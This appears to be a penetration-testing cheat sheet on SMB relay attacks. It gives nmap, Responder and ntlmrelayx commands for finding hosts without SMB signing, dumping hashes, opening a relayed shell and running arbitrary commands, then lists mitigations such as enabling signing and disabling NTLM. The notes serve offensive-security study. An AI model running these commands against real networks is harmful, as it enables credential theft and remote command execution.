---
tags:
    - SMB
---
Identify Hosts without SMB Signing
```
nmap --script=smb2-security-mode.nse -p445 <IP/CIDR> -Pn
```
Edit responder config file
```
sudo mousepad /etc/responder/Responder.conf
```
Run responder
```
sudo responder -I <NIC> -dvP
```
Setup relay to get hash dump 
```
sudo ntlmrelayx.py -tf <TARGETS FILE> -smb2support
```
Setup a listener and get a shell
```
sudo ntlmrelayx.py -tf <TARGETS FILE> -smb2support -i
nc 127.0.0.1 11000
```
Running commands with relay
```
sudo ntlmrelayx.py -tf <TARGETS FILE> -smb2support -c "<COMMAND>"
```
## Mitigation
| Method                          | **Description**                                                                                        |
| ------------------------------- | ------------------------------------------------------------------------------------------------------ |
| **Enable SMB Signing**          | Protects SMB communication from man-in-the-middle attacks by encrypting and authenticating traffic.    |
| **Disable NTLM Authentication** | Prevents the use of the outdated and vulnerable NTLM protocol, enforcing more secure Kerberos auth.    |
| **Account Tiering**             | Organizes accounts by access levels to limit lateral movement and minimize compromise impact.          |
| **Local Admin Restriction**     | Reduces the number of local administrators to lower the attack surface and limit privilege escalation. |

